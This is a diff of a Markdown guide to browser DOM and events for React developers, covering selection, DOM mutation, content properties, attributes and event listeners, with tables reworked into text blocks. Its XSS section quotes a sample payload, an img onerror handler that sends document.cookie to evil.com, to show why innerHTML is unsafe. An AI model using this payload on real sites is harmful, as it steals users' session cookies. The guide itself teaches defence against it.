@@ -25,45 +25,72 @@
 
 ## Table of Contents
 
-- [1. The Mental Model — DOM, Window, and React](#1-the-mental-model--dom-window-and-react)
-- [2. Finding Elements — Selecting and Traversing](#2-finding-elements--selecting-and-traversing)
-- [3. Changing the DOM — Create, Insert, Move, Remove](#3-changing-the-dom--create-insert-move-remove)
-- [4. Content — textContent, innerText, innerHTML](#4-content--textcontent-innertext-innerhtml)
-- [5. Attributes vs Properties, Classes, Styles, Data](#5-attributes-vs-properties-classes-styles-data)
-- [6. How Events Work — Listeners, Phases, Propagation](#6-how-events-work--listeners-phases-propagation)
-- [7. The Event Object](#7-the-event-object)
-- [8. Event Delegation](#8-event-delegation)
-- [9. React's Event System](#9-reacts-event-system)
-- [10. Mouse, Pointer, and Touch](#10-mouse-pointer-and-touch)
-- [11. Keyboard Events](#11-keyboard-events)
-- [12. Focus](#12-focus)
-- [13. Forms and Inputs](#13-forms-and-inputs)
-- [14. Sizes and Positions — The Measurement Properties](#14-sizes-and-positions--the-measurement-properties)
-- [15. Scrolling](#15-scrolling)
-- [16. Resize, Viewport, and Media Queries](#16-resize-viewport-and-media-queries)
-- [17. Observers — Resize, Intersection, Mutation](#17-observers--resize-intersection-mutation)
-- [18. Rendering, Reflow, and Layout Thrashing](#18-rendering-reflow-and-layout-thrashing)
-- [19. Timing — setTimeout, requestAnimationFrame, Idle](#19-timing--settimeout-requestanimationframe-idle)
-- [20. Debounce and Throttle for DOM Events](#20-debounce-and-throttle-for-dom-events)
-- [21. Page Lifecycle and Window Events](#21-page-lifecycle-and-window-events)
-- [22. URL, History, and Navigation](#22-url-history-and-navigation)
-- [23. Selection, Clipboard, and Drag and Drop](#23-selection-clipboard-and-drag-and-drop)
-- [24. Custom Events](#24-custom-events)
-- [25. Refs — Reaching the DOM from React](#25-refs--reaching-the-dom-from-react)
-- [26. Native Listeners in React — useEffect, Cleanup, Stale State](#26-native-listeners-in-react--useeffect-cleanup-stale-state)
-- [27. useEffect vs useLayoutEffect, flushSync](#27-useeffect-vs-uselayouteffect-flushsync)
-- [28. Portals and Event Bubbling](#28-portals-and-event-bubbling)
-- [29. SSR and Hydration — When window Does Not Exist](#29-ssr-and-hydration--when-window-does-not-exist)
-- [30. Recipes — Patterns You Build Again and Again](#30-recipes--patterns-you-build-again-and-again)
-- [31. Dialogs, Popovers, and Positioning](#31-dialogs-popovers-and-positioning)
-- [32. TypeScript Types for DOM and React Events](#32-typescript-types-for-dom-and-react-events)
-- [33. Memory Leaks and Cleanup](#33-memory-leaks-and-cleanup)
-- [34. Accessibility You Get or Lose Through Events](#34-accessibility-you-get-or-lose-through-events)
-- [35. Debugging DOM and Events in DevTools](#35-debugging-dom-and-events-in-devtools)
-- [36. Testing DOM Interactions](#36-testing-dom-interactions)
-- [37. Common Pitfalls](#37-common-pitfalls)
-- [38. Interview Questions](#38-interview-questions)
-- [Related Files](#related-files)
+- [Browser DOM and Events — Everything a React Developer Touches](#browser-dom-and-events--everything-a-react-developer-touches)
+  - [Table of Contents](#table-of-contents)
+  - [1. The Mental Model — DOM, Window, and React](#1-the-mental-model--dom-window-and-react)
+    - [‼️ When a React developer still touches the DOM directly](#️-when-a-react-developer-still-touches-the-dom-directly)
+  - [2. Finding Elements — Selecting and Traversing](#2-finding-elements--selecting-and-traversing)
+  - [3. Changing the DOM — Create, Insert, Move, Remove](#3-changing-the-dom--create-insert-move-remove)
+  - [4. Content — textContent, innerText, innerHTML](#4-content--textcontent-innertext-innerhtml)
+  - [5. Attributes vs Properties, Classes, Styles, Data](#5-attributes-vs-properties-classes-styles-data)
+    - [How React maps these](#how-react-maps-these)
+  - [6. How Events Work — Listeners, Phases, Propagation](#6-how-events-work--listeners-phases-propagation)
+  - [7. The Event Object](#7-the-event-object)
+  - [8. Event Delegation](#8-event-delegation)
+  - [9. React's Event System](#9-reacts-event-system)
+    - [‼️ React event names that do not mean what the DOM name means](#️-react-event-names-that-do-not-mean-what-the-dom-name-means)
+  - [10. Mouse, Pointer, and Touch](#10-mouse-pointer-and-touch)
+  - [11. Keyboard Events](#11-keyboard-events)
+  - [12. Focus](#12-focus)
+  - [13. Forms and Inputs](#13-forms-and-inputs)
+  - [14. Sizes and Positions — The Measurement Properties](#14-sizes-and-positions--the-measurement-properties)
+  - [15. Scrolling](#15-scrolling)
+  - [16. Resize, Viewport, and Media Queries](#16-resize-viewport-and-media-queries)
+  - [17. Observers — Resize, Intersection, Mutation](#17-observers--resize-intersection-mutation)
+  - [18. Rendering, Reflow, and Layout Thrashing](#18-rendering-reflow-and-layout-thrashing)
+  - [19. Timing — setTimeout, requestAnimationFrame, Idle](#19-timing--settimeout-requestanimationframe-idle)
+  - [20. Debounce and Throttle for DOM Events](#20-debounce-and-throttle-for-dom-events)
+  - [21. Page Lifecycle and Window Events](#21-page-lifecycle-and-window-events)
+  - [22. URL, History, and Navigation](#22-url-history-and-navigation)
+  - [23. Selection, Clipboard, and Drag and Drop](#23-selection-clipboard-and-drag-and-drop)
+  - [24. Custom Events](#24-custom-events)
+  - [25. Refs — Reaching the DOM from React](#25-refs--reaching-the-dom-from-react)
+  - [26. Native Listeners in React — useEffect, Cleanup, Stale State](#26-native-listeners-in-react--useeffect-cleanup-stale-state)
+  - [27. useEffect vs useLayoutEffect, flushSync](#27-useeffect-vs-uselayouteffect-flushsync)
+  - [28. Portals and Event Bubbling](#28-portals-and-event-bubbling)
+  - [29. SSR and Hydration — When window Does Not Exist](#29-ssr-and-hydration--when-window-does-not-exist)
+  - [30. Recipes — Patterns You Build Again and Again](#30-recipes--patterns-you-build-again-and-again)
+    - [Click outside to close](#click-outside-to-close)
+    - [Dropdown / menu (accessible basics)](#dropdown--menu-accessible-basics)
+    - [Infinite scroll with IntersectionObserver](#infinite-scroll-with-intersectionobserver)
+    - [Keep a chat log pinned to the bottom (unless the user scrolled up)](#keep-a-chat-log-pinned-to-the-bottom-unless-the-user-scrolled-up)
+    - [Auto-growing textarea](#auto-growing-textarea)
+    - [Copy button with feedback](#copy-button-with-feedback)
+    - [Detect when a sticky header is "stuck"](#detect-when-a-sticky-header-is-stuck)
+    - [Long-press](#long-press)
+  - [31. Dialogs, Popovers, and Positioning](#31-dialogs-popovers-and-positioning)
+  - [32. TypeScript Types for DOM and React Events](#32-typescript-types-for-dom-and-react-events)
+  - [33. Memory Leaks and Cleanup](#33-memory-leaks-and-cleanup)
+  - [34. Accessibility You Get or Lose Through Events](#34-accessibility-you-get-or-lose-through-events)
+  - [35. Debugging DOM and Events in DevTools](#35-debugging-dom-and-events-in-devtools)
+  - [36. Testing DOM Interactions](#36-testing-dom-interactions)
+  - [37. Common Pitfalls](#37-common-pitfalls)
+  - [38. Interview Questions](#38-interview-questions)
+    - ["Explain event bubbling, capturing, and delegation."](#explain-event-bubbling-capturing-and-delegation)
+    - ["What's the difference between `e.target` and `e.currentTarget`?"](#whats-the-difference-between-etarget-and-ecurrenttarget)
+    - ["preventDefault vs stopPropagation?"](#preventdefault-vs-stoppropagation)
+    - ["How does React's event system differ from native events?"](#how-does-reacts-event-system-differ-from-native-events)
+    - ["What are passive event listeners and why do they exist?"](#what-are-passive-event-listeners-and-why-do-they-exist)
+    - ["What is layout thrashing and how do you avoid it?"](#what-is-layout-thrashing-and-how-do-you-avoid-it)
+    - ["`clientWidth` vs `offsetWidth` vs `scrollWidth` vs `getBoundingClientRect()`?"](#clientwidth-vs-offsetwidth-vs-scrollwidth-vs-getboundingclientrect)
+    - ["How do you detect an element entering the viewport? Why not a scroll listener?"](#how-do-you-detect-an-element-entering-the-viewport-why-not-a-scroll-listener)
+    - ["`useEffect` vs `useLayoutEffect`?"](#useeffect-vs-uselayouteffect)
+    - ["Implement click-outside. What edge cases matter?"](#implement-click-outside-what-edge-cases-matter)
+    - ["Why does my dropdown close before the option's click registers?"](#why-does-my-dropdown-close-before-the-options-click-registers)
+    - ["How do you handle keyboard shortcuts correctly?"](#how-do-you-handle-keyboard-shortcuts-correctly)
+    - ["What happens between typing a URL and `DOMContentLoaded` / `load`?"](#what-happens-between-typing-a-url-and-domcontentloaded--load)
+    - ["How would you make a resizable panel?"](#how-would-you-make-a-resizable-panel)
+  - [Related Files](#related-files)
 
 ---
 
@@ -78,11 +105,11 @@
       └── <html>  (document.documentElement)
           ├── <head>
           └── <body> (document.body)
-              └── <div id="root">   ← React owns everything inside this
+              └── <div id="root">   ← React owns everything inside this‼️
                   └── ... your components' DOM nodes
 
   DOM = a tree of JavaScript objects (nodes) that the browser keeps in sync with
-        what is on screen. Change a node → the browser re-styles, re-lays-out and
+        what is on screen. ‼️ Change a node → the browser re-styles, re-lays-out and
         re-paints what is affected.
 
   React = a library that keeps the DOM inside #root matching your JSX.
@@ -91,10 +118,10 @@
 ```
 
 ```text
-NODE TYPES you actually meet:
+NODE TYPES you actually meet:‼️
 
   Node                       base class for everything in the tree
-  ├── Element                tags: <div>, <svg>, ...   (nodeType 1)
+  ├── Element                tags: <div>, <svg>, ...   (nodeType 1)‼️
   │   ├── HTMLElement        HTML tags: .hidden, .dataset, .focus(), .click()
   │   │   ├── HTMLInputElement   .value, .checked, .files, .select()
   │   │   ├── HTMLButtonElement  .disabled, .type, .form
@@ -105,31 +132,71 @@ NODE TYPES you actually meet:
   └── Document / DocumentFragment
 
   EventTarget is ABOVE Node — window, document, every element, XMLHttpRequest,
-  AbortSignal, WebSocket... all can addEventListener.
+  AbortSignal, WebSocket... all can addEventListener.‼️
 ```
 
 ### ‼️ When a React developer still touches the DOM directly
 
-React handles creating and updating nodes. You still reach for the real DOM when you need to:
-
-| Need | Why React alone can't do it | Section |
-|---|---|---|
-| Focus an input, select text | Focus is imperative — there is no `focused` prop | [§12](#12-focus), [§25](#25-refs--reaching-the-dom-from-react) |
-| Measure size/position | Layout only exists after the browser renders | [§14](#14-sizes-and-positions--the-measurement-properties), [§27](#27-useeffect-vs-uselayouteffect-flushsync) |
-| Scroll somewhere | Scroll position is browser state | [§15](#15-scrolling) |
-| Listen to `window`/`document` (resize, Escape, click outside) | Those nodes are outside your JSX | [§26](#26-native-listeners-in-react--useeffect-cleanup-stale-state) |
-| `preventDefault` on wheel/touchmove | React registers those listeners as passive | [§9](#9-reacts-event-system) |
-| Integrate a non-React library (chart, map, editor) | It wants a DOM node to own | [§25](#25-refs--reaching-the-dom-from-react) |
-| Observe size/visibility | ResizeObserver / IntersectionObserver take nodes | [§17](#17-observers--resize-intersection-mutation) |
+React creates and updates the nodes for you. But some things are **browser state**, not
+React state — there is no prop for them. For those you reach for the real DOM, usually
+through a `ref` or a `useEffect`.‼️
 
 ```text
-‼️ THE ONE RULE: never structurally change DOM that React renders (remove/insert/move
-   React-owned nodes, or replace their innerHTML). React's next update assumes its
-   nodes are where it left them; if not, you get
-   "Failed to execute 'removeChild' on 'Node': The node to be removed is not a child
-   of this node." — the same crash browser extensions and Google Translate cause.
-   Reading, focusing, measuring, scrolling, and adding listeners are all fine.
+  YOU WANT TO…                       WHY JSX CAN'T DO IT                 HOW / WHERE
+  ─────────────────────────────────  ──────────────────────────────────  ─────────────────────
+  1. Focus an input, select text     There is no `focused` prop.         ref.current.focus()
+                                     Focus is an action, not a value.‼️  → §12, §25
+
+  2. Measure size or position        Layout only exists AFTER the        getBoundingClientRect()
+                                     browser renders.                    in useLayoutEffect
+                                                                         → §14, §27
+
+  3. Scroll somewhere                Scroll position belongs to the      el.scrollIntoView()
+                                     browser.                            → §15
+
+  4. Listen to window / document     Those nodes are outside your JSX,   addEventListener in
+     (resize, Escape, click outside) so you can't put onX on them.       useEffect + cleanup
+                                                                         → §26
+
+  5. preventDefault on wheel /       React registers those listeners     native listener with
+     touchmove                       as passive, so it's ignored. ‼️     { passive: false }
+                                                                         → §9
+
+  6. Use a non-React library         The library wants an empty DOM      give it ref.current
+     (chart, map, rich editor)       node it fully owns.                 → §25
+
+  7. Watch size or visibility        ResizeObserver / Intersection-      observer.observe(
+                                     Observer take real nodes.             ref.current) → §17
 ```
+
+```text
+‼️ THE ONE RULE
+
+   ✅ OK to do to React's DOM          ❌ Never do to React's DOM
+   ─────────────────────────────       ─────────────────────────────────────
+   read it (sizes, values, text)       remove / insert / move its nodes
+   focus / blur it                     replace its innerHTML
+   scroll it                           change its children in any way
+   measure it
+   add event listeners to it
+
+   Why: on the next update React assumes its nodes are exactly where it left them.
+   If you moved or removed one, React crashes with:
+
+     "Failed to execute 'removeChild' on 'Node':
+      The node to be removed is not a child of this node."
+
+   (Browser extensions and Google Translate cause the same crash — they edit the DOM too.)‼️
+```
+
+Jump to: [§9 React events](#9-reacts-event-system) ·
+[§12 Focus](#12-focus) ·
+[§14 Sizes](#14-sizes-and-positions--the-measurement-properties) ·
+[§15 Scrolling](#15-scrolling) ·
+[§17 Observers](#17-observers--resize-intersection-mutation) ·
+[§25 Refs](#25-refs--reaching-the-dom-from-react) ·
+[§26 Native listeners](#26-native-listeners-in-react--useeffect-cleanup-stale-state) ·
+[§27 useLayoutEffect](#27-useeffect-vs-uselayouteffect-flushsync)
 
 ---
 
@@ -137,29 +204,29 @@ React handles creating and updating nodes. You still reach for the real DOM when
 
 ```js
 // ── Selecting ───────────────────────────────────────────────────────────────
-document.getElementById('app');              // one element or null — fastest, id only
-document.querySelector('.card[data-id="7"]'); // FIRST match of any CSS selector, or null
-document.querySelectorAll('li.done');         // ALL matches — a STATIC NodeList
-el.querySelector('button');                   // works on any element: searches only inside el
+document.getElementById('app'); // one element or null — fastest, id only
+document.querySelector('.card[data-id="7"]'); // FIRST match of any CSS selector, or null‼️
+document.querySelectorAll('li.done'); // ALL matches — a STATIC NodeList
+el.querySelector('button'); // works on any element: searches only inside el‼️
 
 // The old live collections — still around, behave differently (see below)
-document.getElementsByClassName('item');      // LIVE HTMLCollection
-document.getElementsByTagName('li');          // LIVE HTMLCollection
+document.getElementsByClassName('item'); // LIVE HTMLCollection
+document.getElementsByTagName('li'); // LIVE HTMLCollection
 
 // ── Testing an element ──────────────────────────────────────────────────────
-el.matches('.btn.primary');     // true if el itself matches the selector
-el.closest('[data-row-id]');    // nearest ancestor (or el itself) that matches, or null
-                                // ‼️ the workhorse of event delegation (§8)
-parent.contains(child);         // true if child is parent or anywhere inside it
-                                // ‼️ the workhorse of "click outside" (§30)
+el.matches('.btn.primary'); // true if el itself matches the selector
+el.closest('[data-row-id]'); // nearest ancestor (or el itself) that matches, or null
+// ‼️ the workhorse of event delegation (§8)
+parent.contains(child); // true if child is parent or anywhere inside it
+// ‼️ the workhorse of "click outside" (§30)
 ```
 
 ```text
-‼️ STATIC vs LIVE — a classic bug source
+‼️ STATIC vs LIVE — a classic bug source‼️
 
   querySelectorAll → static NodeList: a snapshot. Adding/removing elements later
-                     does NOT change it.
-  getElementsBy*   → live HTMLCollection: re-evaluated every time you read it.
+                     does NOT change it.‼️
+  getElementsBy*   → live HTMLCollection: re-evaluated every time you read it.‼️
   el.childNodes    → live NodeList.
   el.children      → live HTMLCollection.
 
@@ -176,12 +243,12 @@ parent.contains(child);         // true if child is parent or anywhere inside it
 
 ```js
 // ── Traversing ──────────────────────────────────────────────────────────────
-el.parentElement;          // parent element (parentNode can also be document)
-el.children;               // child ELEMENTS only
-el.childNodes;             // child NODES — includes whitespace Text nodes between tags!
-el.firstElementChild;      // vs firstChild, which may be a whitespace Text node
+el.parentElement; // parent element (parentNode can also be document)
+el.children; // child ELEMENTS only
+el.childNodes; // child NODES — includes whitespace Text nodes between tags!‼️
+el.firstElementChild; // vs firstChild, which may be a whitespace Text node
 el.lastElementChild;
-el.nextElementSibling;     // vs nextSibling (may be Text)
+el.nextElementSibling; // vs nextSibling (may be Text)
 el.previousElementSibling;
 
 // ‼️ Prefer the *Element* versions. The plain ones (firstChild, nextSibling) return
@@ -193,11 +260,11 @@ const index = [...el.parentElement.children].indexOf(el);
 
 ```text
 Selector tips:
-  - Attribute values with special characters need quoting:  [data-id="a:b"]
+  - Attribute values with special characters need quoting:  [data-id="a:b"]‼️
   - IDs that start with a digit or contain ':' (older React versions' useId produced
     ":r1:"-style ids) are invalid as #selectors. Use document.getElementById(id),
     or CSS.escape(id):  querySelector('#' + CSS.escape(id))
-  - :scope inside el.querySelectorAll(':scope > li') means "el itself" — direct children only.
+  - :scope inside el.querySelectorAll(':scope > li') means "el itself" — direct children only.‼️
 ```
 
 ---
@@ -209,56 +276,56 @@ Selector tips:
 const li = document.createElement('li');
 li.textContent = 'Buy milk';
 li.className = 'todo';
-li.dataset.id = '42';                       // → data-id="42"
+li.dataset.id = '42'; // → data-id="42"
 
-// SVG must be created in the SVG namespace or it will not render
+// SVG must be created in the SVG namespace or it will not render‼️
 const circle = document.createElementNS('http://www.w3.org/2000/svg', 'circle');
 
 // ── Insert (modern methods — accept several nodes AND plain strings) ────────
-parent.append(li, 'text', otherNode);   // at the end, inside parent
-parent.prepend(li);                     // at the start, inside parent
-ref.before(li);                         // as ref's previous sibling
-ref.after(li);                          // as ref's next sibling
-ref.replaceWith(li);                    // swap ref for li
-parent.replaceChildren(a, b);           // remove all children, then add a, b
-parent.replaceChildren();               // ‼️ the clean way to empty an element
+parent.append(li, 'text', otherNode); // at the end, inside parent
+parent.prepend(li); // at the start, inside parent
+ref.before(li); // as ref's previous sibling
+ref.after(li); // as ref's next sibling
+ref.replaceWith(li); // swap ref for li
+parent.replaceChildren(a, b); // remove all children, then add a, b
+parent.replaceChildren(); // ‼️ the clean way to empty an element
 
 // Older methods you still see
-parent.appendChild(li);                 // one node only, returns it
-parent.insertBefore(li, refNode);       // refNode null → append at end
+parent.appendChild(li); // one node only, returns it
+parent.insertBefore(li, refNode); // refNode null → append at end
 parent.removeChild(li);
 
 // ── Remove ──────────────────────────────────────────────────────────────────
-li.remove();                            // removes itself; no need to find the parent
+li.remove(); // removes itself; no need to find the parent
 ```
 
 ```text
 ‼️ INSERTING AN EXISTING NODE MOVES IT. A node can only be in one place.
    list.append(existingItem) takes it out of wherever it was. To duplicate, clone:
 
-     const copy = node.cloneNode(true);   // true = deep (children too)
+     const copy = node.cloneNode(true);   // true = deep (children too)‼️
                                           // ‼️ listeners added with addEventListener
                                           // are NOT copied; inline onclick attributes are.
-                                          // Duplicate ids are copied too — fix them.
+                                          // Duplicate ids are copied too — fix them.‼️
 ```
 
 ```js
 // ── Inserting many nodes efficiently ────────────────────────────────────────
 // Each insertion into the live document can trigger style/layout work. Build
 // off-document first, then insert once.
-const frag = document.createDocumentFragment();   // a lightweight, invisible container
+const frag = document.createDocumentFragment(); // a lightweight, invisible container
 for (const item of items) {
   const li = document.createElement('li');
   li.textContent = item.name;
-  frag.append(li);                                // not in the document yet — cheap
+  frag.append(li); // not in the document yet — cheap
 }
-list.append(frag);   // one insertion; the fragment empties itself into list
+list.append(frag); // one insertion; the fragment empties itself into list
 
 // ── <template> — inert HTML you clone ───────────────────────────────────────
 // <template id="row"><tr><td class="name"></td></tr></template>
 const tpl = document.getElementById('row');
-const row = tpl.content.cloneNode(true);          // DocumentFragment copy
-row.querySelector('.name').textContent = user.name;  // textContent — safe from XSS
+const row = tpl.content.cloneNode(true); // DocumentFragment copy
+row.querySelector('.name').textContent = user.name; // textContent — safe from XSS
 tbody.append(row);
 ```
 
@@ -275,21 +342,53 @@ el.insertAdjacentHTML('beforeend', '<li>Static text only</li>');
 
 ## 4. Content — textContent, innerText, innerHTML
 
-| Property | Reads | Writes | Cost | Safe with user data? |
-|---|---|---|---|---|
-| `textContent` | All text, including hidden elements and `<script>`/`<style>` text | Plain text (one Text node) | Cheap — no layout | ‼️ **Yes** |
-| `innerText` | Only *rendered* text, as shown (respects CSS, line breaks) | Plain text, `\n` → `<br>` | ‼️ **Forces layout** | Yes |
-| `innerHTML` | Serialized HTML | Parses HTML, replaces all children | Parse + rebuild | ‼️ **No — XSS** |
-| `outerHTML` | The element itself + content | Replaces the element | Parse + rebuild | No |
+```text
+‼️ WHICH ONE TO USE
+   Putting text on the page?          → textContent   (default choice, safe, fast)
+   Need the text as the user SEES it? → innerText     (slower — triggers layout)
+   Need to insert real HTML tags?     → innerHTML     (only with trusted / sanitized HTML)
+
+
+  textContent   ‼️ SAFE with user data · cheap (no layout)
+  ─────────────
+    READ   all the text inside, including hidden elements and <script>/<style> text
+    WRITE  replaces the children with ONE plain Text node — tags are shown as text,
+           never parsed
+
+  innerText     safe with user data · ‼️ FORCES LAYOUT (slow in loops)
+  ─────────────
+    READ   only the text that is RENDERED, the way it looks on screen:
+           skips display:none elements, keeps visual line breaks
+    WRITE  plain text; each \n becomes a <br>
+
+  innerHTML     ‼️ NOT SAFE with user data — XSS · parses HTML + rebuilds children
+  ─────────────
+    READ   the inner content as an HTML string
+    WRITE  parses the string as HTML and REPLACES all children
+           (old children and their listeners are thrown away)
+
+  outerHTML     not safe with user data · parses HTML + rebuilds
+  ─────────────
+    READ   the element ITSELF plus its content, as an HTML string
+    WRITE  replaces the whole element with the parsed HTML
+```
+
+```js
+// The same element read three ways:
+// <div id="box">Hello <span style="display:none">secret</span><b>world</b></div>
+box.textContent; // "Hello secretworld"        ← all text, even hidden
+box.innerText; // "Hello world"              ← only what's visible
+box.innerHTML; // 'Hello <span style="display:none">secret</span><b>world</b>'
+```
 
 ```js
 // ‼️ XSS in one line: user-controlled HTML runs code
 comment.innerHTML = userInput;
 // userInput = '<img src=x onerror="fetch(`//evil.com?c=${document.cookie}`)">'
 // The <img> fails to load, onerror runs attacker JavaScript in your origin.
-// <script> tags inserted via innerHTML do NOT run — but event-handler attributes do.
+// <script> tags inserted via innerHTML do NOT run — but event-handler attributes do.‼️
 
-comment.textContent = userInput;   // ✅ shown as literal text, never parsed
+comment.textContent = userInput; // ✅ shown as literal text, never parsed
 
 // If you genuinely need user-supplied HTML (rich text, markdown output):
 import DOMPurify from 'dompurify';
@@ -314,15 +413,15 @@ More: [../2-medium-priority/WEB-SECURITY-FRONTEND-DEEP.md](../2-medium-priority/
 ## 5. Attributes vs Properties, Classes, Styles, Data
 
 ```text
-‼️ ATTRIBUTE = what is written in the HTML (always a string).
-   PROPERTY  = the live JavaScript value on the DOM object (any type).
+‼️ ATTRIBUTE = what is written in the HTML (always a string).‼️
+   PROPERTY  = the live JavaScript value on the DOM object (any type).‼️
 
    Most are mirrored (id, className ↔ class, title). The ones that are NOT mirrored
    are where bugs live:
 
    <input value="initial">   ← user types "hello"
 
-     input.getAttribute('value')  → "initial"   (attribute = initial / default value)
+     input.getAttribute('value')  → "initial"   (attribute = initial / default value)‼️
      input.defaultValue           → "initial"
      input.value                  → "hello"     ‼️ property = current value
 
@@ -332,7 +431,7 @@ More: [../2-medium-priority/WEB-SECURITY-FRONTEND-DEEP.md](../2-medium-priority/
 
    <a href="/about">
      a.getAttribute('href') → "/about"           (as written)
-     a.href                 → "https://site.com/about"   (resolved absolute URL)
+     a.href                 → "https://site.com/about"   (resolved absolute URL)‼️
 
    Boolean attributes (disabled, checked, hidden, required): presence = true.
      el.setAttribute('disabled', 'false')  → STILL DISABLED. The string doesn't matter.
@@ -341,64 +440,92 @@ More: [../2-medium-priority/WEB-SECURITY-FRONTEND-DEEP.md](../2-medium-priority/
 
 ```js
 // ── Attributes ──────────────────────────────────────────────────────────────
-el.getAttribute('aria-expanded');     // "true" | "false" | null — strings!
+el.getAttribute('aria-expanded'); // "true" | "false" | null — strings!
 el.setAttribute('aria-expanded', String(isOpen));
 el.removeAttribute('hidden');
 el.hasAttribute('disabled');
-el.toggleAttribute('hidden', shouldHide);   // add/remove; 2nd arg forces
+el.toggleAttribute('hidden', shouldHide); // add/remove; 2nd arg forces
 
 // ── Classes ─────────────────────────────────────────────────────────────────
 el.classList.add('open', 'active');
 el.classList.remove('open');
-el.classList.toggle('open');                // returns the new state
-el.classList.toggle('open', isOpen);        // force on/off — no if/else needed
+el.classList.toggle('open'); // returns the new state
+el.classList.toggle('open', isOpen); // force on/off — no if/else needed
 el.classList.contains('open');
 el.classList.replace('old', 'new');
-el.className = 'a b';                       // replaces all classes at once
+el.className = 'a b'; // replaces all classes at once
 
 // ── data-* attributes ───────────────────────────────────────────────────────
 // <div data-user-id="7" data-is-admin="true">
-el.dataset.userId;          // "7"     ← kebab-case becomes camelCase
-el.dataset.isAdmin;         // "true"  ← always a STRING, convert yourself
-el.dataset.userId = '8';    // writes data-user-id="8"
-delete el.dataset.userId;   // removes the attribute
+el.dataset.userId; // "7"     ← kebab-case becomes camelCase
+el.dataset.isAdmin; // "true"  ← always a STRING, convert yourself
+el.dataset.userId = '8'; // writes data-user-id="8"
+delete el.dataset.userId; // removes the attribute
 
 // ── Inline styles ───────────────────────────────────────────────────────────
-el.style.backgroundColor = 'red';             // camelCase property names
-el.style.transform = `translateX(${x}px)`;    // ‼️ units required — '10' does nothing
-el.style.setProperty('--progress', '40%');    // CSS custom properties need setProperty
+el.style.backgroundColor = 'red'; // camelCase property names
+el.style.transform = `translateX(${x}px)`; // ‼️ units required — '10' does nothing
+el.style.setProperty('--progress', '40%'); // CSS custom properties need setProperty‼️
 el.style.removeProperty('--progress');
-el.style.cssText = 'color: red; padding: 4px';// replaces ALL inline styles
+el.style.cssText = 'color: red; padding: 4px'; // replaces ALL inline styles
 
-// el.style only shows INLINE styles. To read what actually applies (from CSS files too):
+// el.style only shows INLINE styles. To read what actually applies (from CSS files too):‼️
 const cs = getComputedStyle(el);
-cs.display;                 // "flex"
+cs.display; // "flex"
 cs.getPropertyValue('--progress');
-cs.width;                   // "240px" — resolved; ‼️ reading this can force layout (§18)
+cs.width; // "240px" — resolved; ‼️ reading this can force layout (§18)
 ```
 
 ```text
 ‼️ Prefer toggling a CLASS (or a data-state attribute) over setting many inline styles.
    CSS stays in CSS, transitions work, and one change = one style recalculation.
    Use inline styles / custom properties only for truly dynamic numbers (positions,
-   progress, drag offsets).
+   progress, drag offsets).‼️
 ```
 
 ### How React maps these
 
-| HTML / DOM | React prop | Note |
-|---|---|---|
-| `class` | `className` | |
-| `for` | `htmlFor` | on `<label>` |
-| `value` (current) | `value` | makes the input **controlled** — React owns it |
-| `value` (initial) | `defaultValue` | **uncontrolled** — DOM owns it after first render |
-| `checked` / initial | `checked` / `defaultChecked` | same split |
-| `style="color: red"` | `style={{ color: 'red' }}` | object, camelCase; numbers get `px` for most properties |
-| `tabindex` | `tabIndex` | |
-| `onclick="..."` | `onClick={fn}` | a function, never a string |
-| `data-*`, `aria-*` | `data-user-id`, `aria-label` | stay kebab-case |
-| boolean `disabled` | `disabled={false}` | React removes the attribute for `false` — no string trap |
-| `--custom-prop` | `style={{ '--progress': '40%' }}` | TS: cast as `React.CSSProperties` |
+```text
+  HTML / DOM               →  REACT PROP                     NOTE
+  ───────────────────────     ─────────────────────────────  ────────────────────────────
+  RENAMED (the HTML name is a reserved word in JavaScript, or React uses camelCase)
+
+  class                    →  className
+  for                      →  htmlFor                        on <label>
+  tabindex                 →  tabIndex
+  onclick="..."            →  onClick={fn}                   a function, never a string
+
+
+  ‼️ VALUES — current vs initial (controlled vs uncontrolled)
+
+  value     (current)      →  value={state}                  CONTROLLED: React owns it,
+                                                             needs onChange
+  value     (initial)      →  defaultValue="..."             UNCONTROLLED: DOM owns it
+                                                             after the first render
+  checked   (current)      →  checked={state}                same split, for checkboxes
+  checked   (initial)      →  defaultChecked                 and radios
+
+
+  STYLES
+
+  style="color: red"       →  style={{ color: 'red' }}       an object, camelCase keys;
+                                                             numbers get px for most
+                                                             properties (width: 10 → 10px)‼️
+  --custom-prop            →  style={{ '--progress': '40%' }}
+                                                             TS: cast as React.CSSProperties
+
+
+  UNCHANGED
+
+  data-*, aria-*           →  data-user-id, aria-label       stay kebab-case, as in HTML
+
+
+  ‼️ BOOLEANS
+
+  disabled (presence)      →  disabled={false}               React removes the attribute
+                                                             for false — no "false"
+                                                             string trap like setAttribute
+```
 
 ---
 
@@ -406,34 +533,36 @@ cs.width;                   // "240px" — resolved; ‼️ reading this can for
 
 ```js
 // ── Adding and removing ─────────────────────────────────────────────────────
-function onClick(event) { /* ... */ }
+function onClick(event) {
+  /* ... */
+}
 
 button.addEventListener('click', onClick);
-button.removeEventListener('click', onClick);   // ‼️ must be the SAME function reference
+button.removeEventListener('click', onClick); // ‼️ must be the SAME function reference
 
-// ❌ This never removes anything: each arrow is a new function
+// ❌ This never removes anything: each arrow is a new function‼️
 button.addEventListener('click', () => save());
 button.removeEventListener('click', () => save());
 
 // ‼️ The capture flag is part of the identity too:
 el.addEventListener('click', fn, { capture: true });
-el.removeEventListener('click', fn);                    // ❌ doesn't match
+el.removeEventListener('click', fn); // ❌ doesn't match
 el.removeEventListener('click', fn, { capture: true }); // ✅
 
-// The same function added twice with the same options is only registered once.
+// The same function added twice with the same options is only registered once.‼️
 ```
 
 ```js
 // ── The options object ──────────────────────────────────────────────────────
 el.addEventListener('click', fn, {
-  capture: false,   // true = run during the capture phase (top-down), see below
-  once: true,       // auto-removed after the first call
-  passive: true,    // you promise NOT to call preventDefault() — lets the browser
-                    // scroll immediately without waiting for your JS (§15)
-  signal,           // an AbortSignal: controller.abort() removes the listener
+  capture: false, // true = run during the capture phase (top-down), see below‼️
+  once: true, // auto-removed after the first call‼️
+  passive: true, // you promise NOT to call preventDefault()‼️ — lets the browser
+  // scroll immediately without waiting for your JS (§15)
+  signal, // an AbortSignal: controller.abort() removes the listener
 });
 
-// ‼️ signal is the cleanest way to remove MANY listeners at once:
+// ‼️ signal is the cleanest way to remove MANY listeners at once:‼️
 const controller = new AbortController();
 window.addEventListener('resize', onResize, { signal: controller.signal });
 window.addEventListener('scroll', onScroll, { signal: controller.signal, passive: true });
@@ -462,7 +591,7 @@ controller.abort();
    Why it matters:
    - A parent can see (and react to) every click inside it      → delegation (§8)
    - A capture listener on document runs BEFORE any child can stopPropagation
